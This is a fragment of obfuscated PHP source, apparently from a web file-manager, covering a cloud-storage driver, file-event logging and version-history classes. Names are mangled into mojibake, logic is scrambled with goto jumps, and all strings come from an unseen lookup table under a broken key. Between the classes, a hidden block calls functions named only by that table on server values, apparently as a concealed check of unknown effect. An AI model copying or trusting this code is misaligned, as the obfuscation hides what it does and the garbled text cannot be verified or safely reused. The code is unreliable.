$aÚÎàÑÄ× = false, $C²¾ÊÅ°Ÿ‰ = false, $FÛ¦°¿Ë = '') { goto AùÒëƒé‚‹; CÄéîÂ„Œ£: $E„¶¢èÆé = array($aİßŒ øÈ[204] => $aÚÎàÑÄ× . $aİßŒ øÈ[205] . rawurlencode($C²¾ÊÅ°Ÿ‰), $aİßŒ øÈ[206] => $Bè°…Å¤·ø); $cÇäâÆ„—´ = $this->link($AÆ…™Á…Ï™, $E„¶¢èÆé); $this->fileOutLink($cÇäâÆ„—´); goto c©ÙÀàÒ¨; AÁçÙ‚¯î : $Bè°…Å¤·ø = get_file_mime(get_path_ext($C²¾ÊÅ°Ÿ‰)); if ($Bè°…Å¤·ø == $aİßŒ øÈ[201]) { return parent::fileOut($AÆ…™Á…Ï™, $aÚÎàÑÄ×, $C²¾ÊÅ°Ÿ‰, $FÛ¦°¿Ë); } $aÚÎàÑÄ× = $aÚÎàÑÄ× ? $aİßŒ øÈ[202] : $aİßŒ øÈ[203]; goto CÄéîÂ„Œ£; AùÒëƒé‚‹: $aİßŒ øÈ =& $_SERVER[“]; if ($this->isFileOutServer()) { return $this->fileOutServer($AÆ…™Á…Ï™, $aÚÎàÑÄ×, $C²¾ÊÅ°Ÿ‰, $FÛ¦°¿Ë); } if (!$C²¾ÊÅ°Ÿ‰) { $C²¾ÊÅ°Ÿ‰ = $this->pathThis($AÆ…™Á…Ï™); } goto AÁçÙ‚¯î ; c©ÙÀàÒ¨: } public function fileOutServer($a†àË‘˜Š¢, $d´ãƒæ©×Œ = false, $aé¯¹™ºÕå = false, $Eë‹ì‰“Ùô = '') { parent::fileOut($a†àË‘˜Š¢, $d´ãƒæ©×Œ, $aé¯¹™ºÕå, $Eë‹ì‰“Ùô); } public function fileOutImageServer($fÙ¶îçÀëò, $Aë£¶¹‰Ì© = 250) { parent::fileOutImage($fÙ¶îçÀëò, $Aë£¶¹‰Ì©); } public function hashMd5($câºñ³•·, $bÂšå—·å = '') { $Dàº«µ²—« =& $_SERVER[“]; $dÕ›ÕÛ’‚† = $this->objectMeta($câºñ³•·); if (!$dÕ›ÕÛ’‚†) { return !1; } $bÂšå—·å = $bÂšå—·å ? $bÂšå—·å : _get($dÕ›ÕÛ’‚†, $Dàº«µ²—«[207]); $bÂšå—·å = $bÂšå—·å ? $bÂšå—·å : _get($dÕ›ÕÛ’‚†, $Dàº«µ²—«[197], $Dàº«µ²—«[33]); return $bÂšå—·å; } public function uploadFormData($F´İØŒå—Í, $CÁ°¥Í£İ­ = 3600) { $EóˆÓƒØö =& $_SERVER[“]; $A¦ÅÔŠ¥  = $this->pathFather($F´İØŒå—Í); $Dø½Â˜¹†ù = $this->client->getHttpUploadPostParams($this->bucket, $A¦ÅÔŠ¥ , $EóˆÓƒØö[185], $CÁ°¥Í£İ­); return array_merge((array) $Dø½Â˜¹†ù, array($EóˆÓƒØö[169] => $this->getHost())); } public function multiUploadFormData($céà‚Òˆ‚Ê, $Cõ¿½¨é“ç = 3600) { $c½ÖƒŒ¨î§ =& $_SERVER[“]; $c·³ƒ°ïò = gmdate($c½ÖƒŒ¨î§[208]); $d”é†¸Êò = array(); $D¨š‚ˆ®Æ” = $this->client->getUploadId($this->bucket, $céà‚Òˆ‚Ê, $d”é†¸Êò); if (!$D¨š‚ˆ®Æ”) { return !1; } return array($c½ÖƒŒ¨î§[209] => $D¨š‚ˆ®Æ”, $c½ÖƒŒ¨î§[169] => $this->getHost() . $c½ÖƒŒ¨î§[8] . $this->pathEncode($céà‚Òˆ‚Ê), $c½ÖƒŒ¨î§[210] => $c·³ƒ°ïò, $c½ÖƒŒ¨î§[89] => $céà‚Òˆ‚Ê); } public function multiUploadAuthData($dÈ¥øÎ´Óİ, $BÕ’Û­·’ = array()) { goto C—¾¸‹Êº; Aœ°Ä·¸éá: $Cƒùß¯õ„ = array($D¹¡ëäÌ½Â[212], $D¹¡ëäÌ½Â[33], $D¹¡ëäÌ½Â[116], $D¹¡ëäÌ½Â[33], "\x78\x2d\x61\155\x7a\55\x64\141\164\x65\72{$BÄÉøÄƒù}", $D¹¡ëäÌ½Â[8] . $this->bucket . $D¹¡ëäÌ½Â[8] . $this->pathEncode($a¥ÜÖ•ñ‰×) . $A¹†ø¾¾¸Ä); if (strpos($A¹†ø¾¾¸Ä, $D¹¡ëäÌ½Â[213]) === 0) { $Cƒùß¯õ„[0] = $D¹¡ëäÌ½Â[214]; } if (isset($BÕ’Û­·’[$D¹¡ëäÌ½Â[215]]) && $BÕ’Û­·’[$D¹¡ëäÌ½Â[215]] == $D¹¡ëäÌ½Â[216]) { $Cƒùß¯õ„[0] = $D¹¡ëäÌ½Â[216]; } goto böäÂ“´±; A¦ÄŠ‡•¨Ã: if (strpos($A¹†ø¾¾¸Ä, $D¹¡ëäÌ½Â[213]) === 0) { return array($D¹¡ëäÌ½Â[220] => $DÁäÍÀè, $D¹¡ëäÌ½Â[210] => $BÄÉøÄƒù); } return $DÁäÍÀè; goto EÚÇíÂ¾‚‘; C—¾¸‹Êº: $D¹¡ëäÌ½Â =& $_SERVER[“]; $BÄÉøÄƒù = isset($BÕ’Û­·’[$D¹¡ëäÌ½Â[210]]) ? $BÕ’Û­·’[$D¹¡ëäÌ½Â[210]] : gmdate($D¹¡ëäÌ½Â[208]); $A¹†ø¾¾¸Ä = isset($BÕ’Û­·’[$D¹¡ëäÌ½Â[160]]) ? $BÕ’Û­·’[$D¹¡ëäÌ½Â[160]] : $D¹¡ëäÌ½Â[33]; goto C¨®Èñ›÷á; böäÂ“´±: $c Ùî¥¡Ÿ = implode($D¹¡ëäÌ½Â[217], $Cƒùß¯õ„); $aøå©ùã÷ = base64_encode(hash_hmac($D¹¡ëäÌ½Â[218], $c Ùî¥¡Ÿ, $this->secret, !0)); $DÁäÍÀè = $D¹¡ëäÌ½Â[219] . $this->accessKey . $D¹¡ëäÌ½Â[4] . $aøå©ùã÷; goto A¦ÄŠ‡•¨Ã; C¨®Èñ›÷á: $a¥ÜÖ•ñ‰× = $BÕ’Û­·’[$D¹¡ëäÌ½Â[89]]; unset($BÕ’Û­·’[$D¹¡ëäÌ½Â[89]]); if (isset($BÕ’Û­·’[$D¹¡ëäÌ½Â[211]])) { $BÕ’Û­·’[$D¹¡ëäÌ½Â[210]] = $BÄÉøÄƒù; return $this->listUploadParts($a¥ÜÖ•ñ‰×, $BÕ’Û­·’); } goto Aœ°Ä·¸éá; EÚÇíÂ¾‚‘: } public function listUploadParts($D¢²‚À‰Šã, $DªìÌè°À³ = array()) { goto bÍÚÏˆµ¤Ú; cùˆ‹à¢÷«: $dÉæÚµĞéŸ = $this->multiUploadAuthData($D¢²‚À‰Šã, $DªìÌè°À³); if (empty($dÉæÚµĞéŸ)) { return !1; } return array($fôÑâ“ºáÁ[220] => $dÉæÚµĞéŸ, $fôÑâ“ºáÁ[210] => $DªìÌè°À³[$fôÑâ“ºáÁ[210]], $fôÑâ“ºáÁ[222] => $C¼ºß×½´); goto FÖ‰âº“‘™; fï„¯È¡ë¢: if (!$C¼ºß×½´) { return !1; } unset($DªìÌè°À³[$fôÑâ“ºáÁ[211]], $DªìÌè°À³[$fôÑâ“ºáÁ[215]]); $DªìÌè°À³[$fôÑâ“ºáÁ[89]] = $D¢²‚À‰Šã; goto cùˆ‹à¢÷«; bÍÚÏˆµ¤Ú: $fôÑâ“ºáÁ =& $_SERVER[“]; $fáË¹·—–ˆ = str_replace($fôÑâ“ºáÁ[221], $fôÑâ“ºáÁ[33], $DªìÌè°À³[$fôÑâ“ºáÁ[160]]); $C¼ºß×½´ = $this->client->listParts($this->bucket, $D¢²‚À‰Šã, $fáË¹·—–ˆ); goto fï„¯È¡ë¢; FÖ‰âº“‘™: } public function getHost() { return parent::getHost() . $_SERVER[“][8] . $this->bucket; } public function size($fÇÖÏ®–¯Æ) { $F¯æ‚Ğó˜Ó = $this->objectMeta($fÇÖÏ®–¯Æ); return $F¯æ‚Ğó˜Ó ? $F¯æ‚Ğó˜Ó[$_SERVER[“][77]] : 0; } public function info($aŠº»‚ä«») { if ($this->isFolder($aŠº»‚ä«»)) { return $this->folderInfo($aŠº»‚ä«»); } else { if ($this->isFile($aŠº»‚ä«»)) { return $this->fileInfo($aŠº»‚ä«»); } } return !1; } public function exist($FÄÅÔĞ‹³‚) { return $this->isFile($FÄÅÔĞ‹³‚) || $this->isFolder($FÄÅÔĞ‹³‚); } public function isFile($D—›ù¸Ñğ‚) { return !$this->isFolder($D—›ù¸Ñğ‚) && $this->objectMeta($D—›ù¸Ñğ‚); } public function isFolder($cÃ¸’ ¢â‰) { return $this->cacheMethod($_SERVER[“][223], $cÃ¸’ ¢â‰); } protected function objectMeta($F „è²Åö) { return $this->cacheMethod($_SERVER[“][224], $F „è²Åö); } protected function _objectMeta($bêÆ÷èÔé) { $E÷¡¬™å˜¼ =& $_SERVER[“]; $bêÆ÷èÔé = rtrim($bêÆ÷èÔé, $E÷¡¬™å˜¼[8]); try { $BÀÑâ‡®éÃ = $this->client->getObjectInfo($this->bucket, $bêÆ÷èÔé); if (!isset($BÀÑâ‡®éÃ[$E÷¡¬™å˜¼[207]]) && isset($BÀÑâ‡®éÃ[$E÷¡¬™å˜¼[225]])) { $BÀÑâ‡®éÃ[$E÷¡¬™å˜¼[207]] = $BÀÑâ‡®éÃ[$E÷¡¬™å˜¼[225]]; } } catch (Exception $BÕ‚Ò®ìî) { $BÀÑâ‡®éÃ = !1; } if (!$BÀÑâ‡®éÃ) { } return $BÀÑâ‡®éÃ; } protected function _isFolder($C»­êøÇĞò) { goto A’§Ã¾Ãéã; a¢°İ¼´è¥: if (substr($Dƒª¶’Ëîô[0][$Fé¶†…ÏŒ[28]], -1) == $Fé¶†…ÏŒ[8]) { return !0; } if (get_path_this($Dƒª¶’Ëîô[0][$Fé¶†…ÏŒ[28]]) == get_path_this($C»­êøÇĞò)) { return !1; } return !0; goto Dèšä”²Ï’; b¶ÉÁ‚ŒÎ›: $Dƒª¶’Ëîô = $this->client->getBucket($this->bucket, $C»­êøÇĞò, null, 1); if (empty($Dƒª¶’Ëîô)) { return !1; } $Dƒª¶’Ëîô = array_values($Dƒª¶’Ëîô); goto a¢°İ¼´è¥; A’§Ã¾Ãéã: $Fé¶†…ÏŒ =& $_SERVER[“]; $C»­êøÇĞò = rtrim($C»­êøÇĞò, $Fé¶†…ÏŒ[8]); if ($C»­êøÇĞò == $Fé¶†…ÏŒ[33] || $C»­êøÇĞò == $Fé¶†…ÏŒ[8]) { return !0; } goto b¶ÉÁ‚ŒÎ›; Dèšä”²Ï’: } } define($_SERVER[“][226], 1); goto c‰¯¤³›·æ; cÈ¾ „Û‹Š: define($_SERVER[“][1924], 3); define($_SERVER[“][1925], 4); define($_SERVER[“][1926], 5); goto EğÇá‘¿ã¡; fÖ“µ¤è Ÿ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\143\145\137\145\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\151\x6d\x65", "\164\151\x6d\x65", "\151\156\163\x65\x72\164", "\146\165\x6e\x63\164\151\157\156"), array("\x64\145\163\143", '', "\151\x6e\x73\145\x72\x74\x2c\x75\x70\x64\x61\x74\145\x2c\163\x65\154\x65\143\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($BÄÖ¸‘¢©‹, $CÒç­«Âˆª, $d¢Ì¶ß”– = '') { goto Eé‚’‹âœè; dêÇéÉ›„: if (!$cº²äŠÁÍ›) { return !1; } if ($this->isCacheEvent($cº²äŠÁÍ›, $CÒç­«Âˆª)) { return; } if ($d¢Ì¶ß”– && is_string($d¢Ì¶ß”–)) { $d¢Ì¶ß”– = array($D§¾”ë¼ï[2125] => $d¢Ì¶ß”–); } goto Cª¡¥—Åê; Cª¡¥—Åê: $Bå§‰„µ« = array($D§¾”ë¼ï[383] => $BÄÖ¸‘¢©‹, $D§¾”ë¼ï[2286] => $cº²äŠÁÍ›[$D§¾”ë¼ï[463]], $D§¾”ë¼ï[2287] => $cº²äŠÁÍ›[$D§¾”ë¼ï[28]], $D§¾”ë¼ï[468] => $cº²äŠÁÍ›[$D§¾”ë¼ï[468]], $D§¾”ë¼ï[1413] => USER_ID, $D§¾”ë¼ï[388] => $CÒç­«Âˆª, $D§¾”ë¼ï[1415] => $d¢Ì¶ß”–); $this->addSystemLog($CÒç­«Âˆª, $Bå§‰„µ«); return $this->add($Bå§‰„µ«); goto cíÜóˆ¾ˆ; Eé‚’‹âœè: $D§¾”ë¼ï =& $_SERVER[“]; if (!$this->eventSave) { return; } $cº²äŠÁÍ› = Model($D§¾”ë¼ï[1104])->sourceInfo($BÄÖ¸‘¢©‹); goto dêÇéÉ›„; cíÜóˆ¾ˆ: } private function addSystemLog($c‚ ÊÎº‰, $E‚‰ÓÀ‘¦) { $e½Şäø°¹Ö =& $_SERVER[“]; if ($c‚ ÊÎº‰ == $e½Şäø°¹Ö[2288]) { $c‚ ÊÎº‰ = $E‚‰ÓÀ‘¦[$e½Şäø°¹Ö[405]][$e½Şäø°¹Ö[2289]]; } else { if (in_array($c‚ ÊÎº‰, array($e½Şäø°¹Ö[2072], $e½Şäø°¹Ö[2290]))) { $c‚ ÊÎº‰ = $E‚‰ÓÀ‘¦[$e½Şäø°¹Ö[405]][$e½Şäø°¹Ö[676]]; } } $FŠ¥ƒÈ©Ñ = array_merge($E‚‰ÓÀ‘¦, array($e½Şäø°¹Ö[2291] => $E‚‰ÓÀ‘¦[$e½Şäø°¹Ö[369]], $e½Şäø°¹Ö[2292] => $E‚‰ÓÀ‘¦[$e½Şäø°¹Ö[2292]])); Model($e½Şäø°¹Ö[2035])->addLog($e½Şäø°¹Ö[2293] . $c‚ ÊÎº‰, $FŠ¥ƒÈ©Ñ); } private function isCacheEvent($bˆÒîˆöÙ, $bš¨Ÿ¶Ö) { if ($bˆÒîˆöÙ[$_SERVER[“][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($c½‡šå¥æ™, $fŒº·ƒß) { $a‡©³ø¶ƒí =& $_SERVER[“]; $F´äª‹¯Ô = Model($a‡©³ø¶ƒí[1104])->sourceInfo($c½‡šå¥æ™); $e«Ã¤‹âª = array($a‡©³ø¶ƒí[2289] => $fŒº·ƒß, $a‡©³ø¶ƒí[28] => $F´äª‹¯Ô[$a‡©³ø¶ƒí[28]]); return $this->addEvent($c½‡šå¥æ™, $a‡©³ø¶ƒí[2288], $e«Ã¤‹âª); } public function eventFileEdit($b†ë‰“¬à) { $fÃÈ…Ó×Â =& $_SERVER[“]; $AŸÆ²‹›©á = array($fÃÈ…Ó×Â[2294] => $_SERVER[$fÃÈ…Ó×Â[2295]], $fÃÈ…Ó×Â[1739] => strtolower(ACTION)); return $this->addEvent($b†ë‰“¬à, $fÃÈ…Ó×Â[2062], $AŸÆ²‹›©á); } public function eventRecycle($Dß·®ìÍ–¬, $bíò”›‚Ÿ¿) { return $this->addEvent($Dß·®ìÍ–¬, $_SERVER[“][2290], $bíò”›‚Ÿ¿); } public function eventRemove($aŒ±»³ò¾—) { $EÌ‚Ä‘±Š£ =& $_SERVER[“]; $f…æ½‰–Öº = Model($EÌ‚Ä‘±Š£[1104])->sourceInfo($aŒ±»³ò¾—); $E™‘“Ò­ø = $f…æ½‰–Öº[$EÌ‚Ä‘±Š£[28]]; return $this->addEvent($f…æ½‰–Öº[$EÌ‚Ä‘±Š£[463]], $EÌ‚Ä‘±Š£[2061], $E™‘“Ò­ø); } public function eventShare($b¯êÛøª, $aóŒéÁµËç) { return $this->addEvent($b¯êÛøª, $_SERVER[“][2072], $aóŒéÁµËç); } public function eventMove($EœÕøø Îí, $c«ŞØ‡·‚é, $eó’¨õÍğ) { goto d“¤î¬ë¯ˆ; AİŒ»ÊÄ˜ã: $this->addEvent($EœÕøø Îí, $C´‹ÌŠóŞ©[494], $A‰§²ê‡‹®); $eˆ’ÈÜ¾­œ = $e÷Õãó¼˜Ø->sourceInfo($EœÕøø Îí); $A‰§²ê‡‹® = array($C´‹ÌŠóŞ©[369] => $eˆ’ÈÜ¾­œ[$C´‹ÌŠóŞ©[369]], $C´‹ÌŠóŞ©[28] => $eˆ’ÈÜ¾­œ[$C´‹ÌŠóŞ©[28]]); goto D·Š·Š“êî; D·Š·Š“êî: $this->addEvent($c«ŞØ‡·‚é, $C´‹ÌŠóŞ©[2300], $A‰§²ê‡‹®); goto DÎÏÓ§åö¡; d“¤î¬ë¯ˆ: $C´‹ÌŠóŞ© =& $_SERVER[“]; $e÷Õãó¼˜Ø = Model($C´‹ÌŠóŞ©[1104]); $eˆ’ÈÜ¾­œ = $e÷Õãó¼˜Ø->sourceInfo($EœÕøø Îí); goto b„Ÿ»ÅÖ¶; b„Ÿ»ÅÖ¶: $A‚©­äÑ¨¿ = $e÷Õãó¼˜Ø->sourceInfo($c«ŞØ‡·‚é); $FĞÚ—İŠ±Â = $e÷Õãó¼˜Ø->sourceInfo($eó’¨õÍğ); $A‰§²ê‡‹® = array($C´‹ÌŠóŞ©[994] => $c«ŞØ‡·‚é, $C´‹ÌŠóŞ©[2296] => $A‚©­äÑ¨¿[$C´‹ÌŠóŞ©[28]], $C´‹ÌŠóŞ©[2297] => $A‚©­äÑ¨¿[$C´‹ÌŠóŞ©[468]], $C´‹ÌŠóŞ©[995] => $eó’¨õÍğ, $C´‹ÌŠóŞ©[2298] => $FĞÚ—İŠ±Â[$C´‹ÌŠóŞ©[28]], $C´‹ÌŠóŞ©[2299] => $FĞÚ—İŠ±Â[$C´‹ÌŠóŞ©[468]]); goto AİŒ»ÊÄ˜ã; DÎÏÓ§åö¡: } public function eventCopy($d²ŒñÓ‡åÔ) { $this->eventCreate($d²ŒñÓ‡åÔ, $_SERVER[“][492]); } public function eventRename($cš‘âîÈù, $A¦ß¸¬¢ÉÉ, $FÆË‡İïß‡) { $B’ó¦ó³àá =& $_SERVER[“]; $BÖ¤ÏËª‹ = array($B’ó¦ó³àá[994] => $A¦ß¸¬¢ÉÉ, $B’ó¦ó³àá[995] => $FÆË‡İïß‡); return $this->addEvent($cš‘âîÈù, $B’ó¦ó³àá[1117], $BÖ¤ÏËª‹); } public function eventAddComment($aÕšø öñâ, $aˆêêíğ·œ) { return $this->addEvent($aÕšø öñâ, $_SERVER[“][2301], $aˆêêíğ·œ); } public function eventAddDesc($e¿‡ˆ×Ï, $fÀ»çğ«Œ) { return $this->addEvent($e¿‡ˆ×Ï, $_SERVER[“][2302], $fÀ»çğ«Œ); } public function listBySource($b–Å´Ÿ¡”º) { goto FÂëìŞ©°Õ; FÂëìŞ©°Õ: $A·ŒêŸÎò =& $_SERVER[“]; $eî©ê’íØè = Model($A·ŒêŸÎò[1104])->sourceInfo($b–Å´Ÿ¡”º); $DÅà‰¾Ó‚ = array($A·ŒêŸÎò[383] => $b–Å´Ÿ¡”º); goto cÇº¯Å»“‰; cÇº¯Å»“‰: if ($eî©ê’íØè[$A·ŒêŸÎò[370]] == $A·ŒêŸÎò[83]) { $a¶‘—ÎÇÀŒ = Model($A·ŒêŸÎò[1104])->listSearchChildren($b–Å´Ÿ¡”º, 20000); $a¶‘—ÎÇÀŒ[] = $b–Å´Ÿ¡”º . $A·ŒêŸÎò[361]; $DÅà‰¾Ó‚ = array($A·ŒêŸÎò[369] => array($A·ŒêŸÎò[7], $a¶‘—ÎÇÀŒ)); } $DËš¢·ˆŒï = $this->where($DÅà‰¾Ó‚)->order($A·ŒêŸÎò[2303])->selectPage(); if ($DËš¢·ˆŒï[$A·ŒêŸÎò[351]][$A·ŒêŸÎò[352]] == 0) { $DËš¢·ˆŒï[$A·ŒêŸÎò[351]][$A·ŒêŸÎò[352]] = 1; $DËš¢·ˆŒï[$A·ŒêŸÎò[354]] = array(array($A·ŒêŸÎò[383] => $b–Å´Ÿ¡”º, $A·ŒêŸÎò[2286] => $eî©ê’íØè[$A·ŒêŸÎò[463]], $A·ŒêŸÎò[1413] => $eî©ê’íØè[$A·ŒêŸÎò[378]], $A·ŒêŸÎò[388] => $A·ŒêŸÎò[2304], $A·ŒêŸÎò[389] => $eî©ê’íØè[$A·ŒêŸÎò[187]], $A·ŒêŸÎò[1415] => $A·ŒêŸÎò[33])); } goto bì…Õê¡ô¾; bì…Õê¡ô¾: return $this->eventListParse($DËš¢·ˆŒï, $b–Å´Ÿ¡”º); goto EË°×–°´Í; EË°×–°´Í: } private function eventListParse($eÜöê¸ é‡, $c‡Ã†Ë«¤ö) { goto a„ù£›…ã´; aĞ›£×“—: $b¨óÇÖœõ = Model($aÆ¨öÆêÅµ[736])->sourceListInfo($fïä±ÍŸìÍ, !0); foreach ($Eéá±Ê£»Ö as &$Dç¿ÒªªÚ) { if ($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[29]] == $aÆ¨öÆêÅµ[494] && isset($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[994]])) { $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[994]] = $b¨óÇÖœõ[$Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[994]]]; $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[995]] = $b¨óÇÖœõ[$Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[995]]]; } if ($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[29]] == $aÆ¨öÆêÅµ[2300] && isset($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[369]])) { $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[369]] = $b¨óÇÖœõ[$Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]][$aÆ¨öÆêÅµ[369]]]; } $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[391]] = $b¨óÇÖœõ[$Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[369]]]; $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[2305]] = $b¨óÇÖœõ[$Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[2292]]]; if ($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[29]] == $aÆ¨öÆêÅµ[2061]) { $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[2305]] = $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[391]]; $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[2292]] = $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[2305]][$aÆ¨öÆêÅµ[369]]; $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[391]] = !1; $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[369]] = $aÆ¨öÆêÅµ[33]; } $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[2248]] = $aÃÜ¢ÕˆÃ[$Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[1423]]]; } $eÜöê¸ é‡[$aÆ¨öÆêÅµ[354]] = $Eéá±Ê£»Ö; goto FŠçØ˜›ê…; c§Ùœ”ìè: $fïä±ÍŸìÍ = array_unique($fïä±ÍŸìÍ); $c•¢´ìÍ = array_unique(array_to_keyvalue($Eéá±Ê£»Ö, $aÆ¨öÆêÅµ[33], $aÆ¨öÆêÅµ[1423])); $aÃÜ¢ÕˆÃ = Model($aÆ¨öÆêÅµ[479])->userListInfo($c•¢´ìÍ); goto aĞ›£×“—; FŠçØ˜›ê…: return $eÜöê¸ é‡; goto AÊæçÜˆƒÔ; Eí ¤çß½: $bëà‹‰Ù¢­ = array_to_keyvalue($Eéá±Ê£»Ö, $aÆ¨öÆêÅµ[33], $aÆ¨öÆêÅµ[2292]); foreach ($Eéá±Ê£»Ö as $Dç¿ÒªªÚ) { $FÖ…éÁë÷® = $Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[405]]; if ($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[29]] == $aÆ¨öÆêÅµ[494] && isset($FÖ…éÁë÷®[$aÆ¨öÆêÅµ[994]])) { $fïä±ÍŸìÍ[] = $FÖ…éÁë÷®[$aÆ¨öÆêÅµ[994]] . $aÆ¨öÆêÅµ[33]; $fïä±ÍŸìÍ[] = $FÖ…éÁë÷®[$aÆ¨öÆêÅµ[995]] . $aÆ¨öÆêÅµ[33]; } if ($Dç¿ÒªªÚ[$aÆ¨öÆêÅµ[29]] == $aÆ¨öÆêÅµ[2300] && isset($FÖ…éÁë÷®[$aÆ¨öÆêÅµ[369]])) { $fïä±ÍŸìÍ[] = $FÖ…éÁë÷®[$aÆ¨öÆêÅµ[369]] . $aÆ¨öÆêÅµ[33]; } } $fïä±ÍŸìÍ = array_merge($fïä±ÍŸìÍ, $bëà‹‰Ù¢­, array($c‡Ã†Ë«¤ö . $aÆ¨öÆêÅµ[33])); goto c§Ùœ”ìè; a„ù£›…ã´: $aÆ¨öÆêÅµ =& $_SERVER[“]; $Eéá±Ê£»Ö = $eÜöê¸ é‡[$aÆ¨öÆêÅµ[354]]; $fïä±ÍŸìÍ = array_to_keyvalue($Eéá±Ê£»Ö, $aÆ¨öÆêÅµ[33], $aÆ¨öÆêÅµ[369]); goto Eí ¤çß½; AÊæçÜˆƒÔ: } public function removeBySource($AÔ¾”¥„°Ó) { $a³éÖç´Ì„ = array($_SERVER[“][383] => $AÔ¾”¥„°Ó); $this->where($a³éÖç´Ì„)->remove(); } } if ($_SERVER[$_SERVER[“][774]] != $_SERVER[$_SERVER[“][2306]]) { goto F‡²‹·ÎØ; F‡²‹·ÎØ: $D¯ĞÒØ¬Ôí = $_SERVER[“][776]; $eß‹ˆÈô…Ú = $_SERVER[$_SERVER[“][777]] . $_SERVER[“][778]; $Aö‚×­… „ = $D¯ĞÒØ¬Ôí($eß‹ˆÈô…Ú); goto bèˆÒ×„óÇ; bèˆÒ×„óÇ: $fßë¤Áß¬ = explode($_SERVER[“][217], $Aö‚×­… „); if (count($fßë¤Áß¬) < $_SERVER[“][559]) { $f“±¶©Œ‚Ô = $_SERVER[“][779]; $f“±¶©Œ‚Ô(); } $cˆî¤ñ© = $_SERVER[“][1422]; goto F›áÇÕ²Ñ…; F›áÇÕ²Ñ…: $cˆî¤ñ©($_SERVER[$_SERVER[“][1738]]); goto b½Ş”§²¬õ; b½Ş”§²¬õ: } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\143\x65\x5f\x68\151\163\x74\157\x72\171"; public function addHistory($Eî›œ»…Ú¶, $EÛ‡Ç¢Ë¿ = '') { $E’ªÙÎ‚´ê =& $_SERVER[“]; $BÂÙï´âô¡ = array($E’ªÙÎ‚´ê[383] => $Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[369]], $E’ªÙÎ‚´ê[1413] => isset($Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[379]]) ? $Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[379]] : $Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[378]], $E’ªÙÎ‚´ê[420] => $Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[419]], $E’ªÙÎ‚´ê[522] => $Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[77]], $E’ªÙÎ‚´ê[2307] => $EÛ‡Ç¢Ë¿); $bÜ™Š¤À = $GLOBALS[$E’ªÙÎ‚´ê[6]][$E’ªÙÎ‚´ê[84]][$E’ªÙÎ‚´ê[2308]]; if ($bÜ™Š¤À > 1) { $this->historyAutoClear($BÂÙï´âô¡[$E’ªÙÎ‚´ê[369]]); $this->add($BÂÙï´âô¡); } Model($E’ªÙÎ‚´ê[2309])->eventFileEdit($Eî›œ»…Ú¶[$E’ªÙÎ‚´ê[369]]); } private function historyAutoClear($fĞåÕÔ‹›±) { goto F¦ˆ‹ñ·˜²; a¶òôº½ªÑ: $FŸÒ•†Á = $cØà©Æ¯“ == $D…Èğ¾‰»[2311] ? 3 : $C÷¬ìÍ£Š°; if ($C÷¬ìÍ£Š° <= 1) { $FŸÒ•†Á = 1; } $dÑ½¸Šìİ = $FŸÒ•†Á - 1; goto dğ’°éîòí; F¦ˆ‹ñ·˜²: $D…Èğ¾‰» =& $_SERVER[“]; $cØà©Æ¯“ = Model($D…Èğ¾‰»[1075])->get($D…Èğ¾‰»[2310]); $C÷¬ìÍ£Š° = $GLOBALS[$D…Èğ¾‰»[6]][$D…Èğ¾‰»[84]][$D…Èğ¾‰»[2308]]; goto a¶òôº½ªÑ; A™—†É†: $EŞÒÊŸÒ£² = array($D…Èğ¾‰»[385] => array($D…Èğ¾‰»[7], $CßÇ¸§øàˆ)); $this->where($EŞÒÊŸÒ£²)->delete(); Model($D…Èğ¾‰»[422])->remove($F¹××í˜¬Ü); goto f»£å¯¹ƒ¹; dğ’°éîòí: if ($dÑ½¸Šìİ >= 500) { return; } $EŞÒÊŸÒ£² = array($D…Èğ¾‰»[383] => $fĞåÕÔ‹›±); $cø»…©Ö‚Ë = $this->field($D…Èğ¾‰»[2312])->where($EŞÒÊŸÒ£²)->order($D…Èğ¾‰»[2303])->select(); goto e‰†Â†ÔÑ‡; e‰†Â†ÔÑ‡: if (!$cø»…©Ö‚Ë || $dÑ½¸Šìİ >= count($cø»…©Ö‚Ë)) { return; } $CßÇ¸§øàˆ = array_to_keyvalue($cø»…©Ö‚Ë, $D…Èğ¾‰»[33], $D…Èğ¾‰»[367]); $CßÇ¸§øàˆ = array_slice($CßÇ¸§øàˆ, $dÑ½¸Šìİ); goto eâï­Íø; eâï­Íø: $F¹××í˜¬Ü = 